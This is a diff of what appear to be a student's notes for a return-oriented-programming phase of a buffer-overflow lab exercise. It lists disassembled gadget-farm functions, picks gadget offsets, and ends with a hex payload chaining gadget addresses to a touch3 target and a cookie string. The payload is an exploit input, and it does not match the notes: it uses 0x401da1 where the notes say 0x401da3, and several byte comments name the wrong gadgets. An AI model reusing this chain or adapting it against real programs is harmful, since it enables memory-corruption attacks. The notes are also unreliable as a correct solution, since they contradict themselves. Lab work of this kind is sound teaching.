@@ -182,3 +182,82 @@ phase3
 address - 0x0000000000401ceb 
 
 rsp from phase2 $rsp 0x55609548 + 0x28 = 0x55609580
+
+
+Phase4 
+
+0000000000401d88 <start_farm>:
+  401d88: b8 01 00 00 00               	movl	$0x1, %eax
+  401d8d: c3                           	retq
+
+0000000000401d8e <setval_211>:
+  401d8e: c7 07 18 90 90 c3            	movl	$0xc3909018, (%rdi)     # imm = 0xC3909018
+  401d94: c3                           	retq
+
+0000000000401d95 <getval_276>:
+  401d95: b8 77 c7 0a 58               	movl	$0x580ac777, %eax       # imm = 0x580AC777
+  401d9a: c3                           	retq
+
+0000000000401d9b <getval_360>:
+  401d9b: b8 48 89 c7 92               	movl	$0x92c78948, %eax       # imm = 0x92C78948
+  401da0: c3                           	retq
+
+0000000000401da1 <setval_253>:
+  401da1: c7 07 48 89 c7 c3            	movl	$0xc3c78948, (%rdi)     # imm = 0xC3C78948
+  401da7: c3                           	retq
+
+0000000000401da8 <getval_232>:
+  401da8: b8 aa 40 89 c7               	movl	$0xc78940aa, %eax       # imm = 0xC78940AA
+  401dad: c3                           	retq
+
+0000000000401dae <addval_240>:
+  401dae: 8d 87 79 50 c3 06            	leal	0x6c35079(%rdi), %eax
+  401db4: c3                           	retq
+
+0000000000401db5 <addval_351>:
+  401db5: 8d 87 48 89 c7 c3            	leal	-0x3c3876b8(%rdi), %eax
+  401dbb: c3                           	retq
+
+0000000000401dbc <setval_228>:
+  401dbc: c7 07 f4 dc 58 90            	movl	$0x9058dcf4, (%rdi)     # imm = 0x9058DCF4
+  401dc2: c3                           	retq
+
+0000000000401dc3 <mid_farm>:
+  401dc3: b8 01 00 00 00               	movl	$0x1, %eax
+  401dc8: c3                           	retq
+
+
+
+0000000000401d95 <getval_276>:    we will use 401d95 + 4 = 401d99
+  401d95: b8 77 c7 0a 58               	movl	$0x580ac777, %eax       # imm = 0x580AC777
+  401d9a: c3                           	retq
+
+0000000000401da1 <setval_253>:    we will use 401da1 + 2 = 401da3
+
+  401da1: c7 07 48 89 c7 c3            	movl	$0xc3c78948, (%rdi)     # imm = 0xC3C78948
+  401da7: c3                           	retq
+
+we are doing 
+
+popq %rax
+movq %rax %rdi
+ret
+
+
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /*end buffer*/
+80 1e 40 00 00 00 00 00 /*rsp -> rax*/
+a1 1d 40 00 00 00 00 00 /*rax -> rdi*/
+99 1d 40 00 00 00 00 00 /*address for pop rax*/
+00 00 00 00 00 00 00 00
+62 1e 40 00 00 00 00 00 /*eax -> edx */
+8c 1e 40 00 00 00 00 00 /*edx -> ecx*/
+46 1e 40 00 00 00 00 00 /*ecx -> esi */
+c9 1d 40 00 00 00 00 00 /*lea add_xy*/
+a1 1d 40 00 00 00 00 00
+eb 1c 40 00 00 00 00 00 /*touch 3 address */
+31 33 30 63 34 37 63 37 /* cookie as string */
